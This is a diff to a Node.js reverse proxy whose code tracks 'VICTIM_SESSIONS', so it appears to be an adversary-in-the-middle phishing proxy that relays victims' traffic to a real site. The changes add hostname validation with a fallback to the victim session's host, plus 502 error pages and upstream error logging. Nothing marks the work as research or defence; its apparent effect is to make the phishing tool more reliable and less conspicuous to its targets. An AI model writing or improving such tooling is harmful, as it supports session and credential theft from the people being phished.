@@ -250,8 +250,17 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
                                     proxyRequestOptions.headers = { ...headers, ...clientRequestBody.headers };
                                     if (proxyRequestURL.hostname !== headers.host) {
-                                        proxyRequestOptions.hostname = proxyRequestURL.hostname;
-                                        proxyRequestOptions.headers.host = proxyRequestURL.host;
+                                        // Validate hostname before setting
+                                        const hostname = proxyRequestURL.hostname;
+                                        if (hostname && hostname.length <= 253 && /^[a-zA-Z0-9.-]+$/.test(hostname)) {
+                                            proxyRequestOptions.hostname = hostname;
+                                            proxyRequestOptions.headers.host = proxyRequestURL.host;
+                                        } else {
+                                            console.error(`Invalid hostname detected: ${hostname}`);
+                                            // Use the original session hostname as fallback
+                                            proxyRequestOptions.hostname = VICTIM_SESSIONS[currentSession].hostname;
+                                            proxyRequestOptions.headers.host = VICTIM_SESSIONS[currentSession].host;
+                                        }
                                     }
                                     if (proxyRequestOptions.headers.referer) {
                                         proxyRequestOptions.headers.referer = clientRequestBody.referrer;
@@ -353,6 +362,25 @@ proxyServer.listen(process.env.PORT ?? 3000);
 
 
 const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest) => {
+    // Validate hostname before making request
+    if (!proxyRequestOptions.hostname || proxyRequestOptions.hostname.length > 253) {
+        console.error(`Invalid hostname: ${proxyRequestOptions.hostname}`);
+        clientResponse.writeHead(502, { "Content-Type": "text/html" });
+        clientResponse.end(`
+            <!DOCTYPE html>
+            <html>
+            <head><title>502 Bad Gateway</title></head>
+            <body>
+                <h1>502 Bad Gateway</h1>
+                <p>Invalid hostname in request.</p>
+            </body>
+            </html>
+        `);
+        return;
+    }
+    
+    prepareProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHostname);
+
     const protocol = proxyRequestProtocol === "https:" ? https : http;
     const proxyRequest = protocol.request(proxyRequestOptions, (proxyResponse) => {
 
@@ -449,6 +477,28 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
         proxyRequest.write(proxyRequestBody);
     }
     proxyRequest.end();
+    proxyRequest.on("error", (error) => {
+        console.error(`Proxy request error: ${error.message}`, {
+            hostname: proxyRequestOptions.hostname,
+            path: proxyRequestOptions.path,
+            error: error.code
+        });
+        
+        // Send proper error response to client
+        if (!clientResponse.headersSent) {
+            clientResponse.writeHead(502, { "Content-Type": "text/html" });
+            clientResponse.end(`
+                <!DOCTYPE html>
+                <html>
+                <head><title>502 Bad Gateway</title></head>
+                <body>
+                    <h1>502 Bad Gateway</h1>
+                    <p>The proxy server received an invalid response from an upstream server.</p>
+                </body>
+                </html>
+            `);
+        }
+    });
 }
 
 function displayError(message, error, ...args) {
